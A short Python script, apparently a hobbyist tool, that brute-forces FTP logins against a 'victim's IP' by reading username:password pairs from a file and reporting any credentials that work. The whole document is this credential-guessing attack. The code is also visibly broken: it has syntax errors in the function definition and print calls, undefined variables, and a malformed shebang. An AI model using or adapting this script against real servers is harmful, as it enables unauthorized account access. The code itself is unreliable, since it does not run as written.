#!usr/bin/python3


import ftplib
import argparse
from termcolor import colored

parser = argparse.ArgumentParser()
parser.add_argument('--target', '-T',help='Specify victim\'s  IP via --target or -T')
parser.add_argument('--passwd', '-P', help='Specify file name and/or path to file --passwd or -P')
args = parser.parse_args()


def bruteLogin(args.target, args.passwd):

	try:
		pf = open(passwdfile,"r"):

	except:
		print("[!!] File Doesn't Exist!")

	for line in pf.readlines():

		username = line.split(':')[0]
		passwd   = line.split(':')[1]
		print("[+] Trying: " + username + "/" + passwd)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(username, passwd)
			print(colored,"[+] Login Successful With: " + username + "/" + passwd,'green')
			ftp.quit()
			return(username, passwd)
		except:
			pass

	print(colored,"[-] Password not in list".'red')



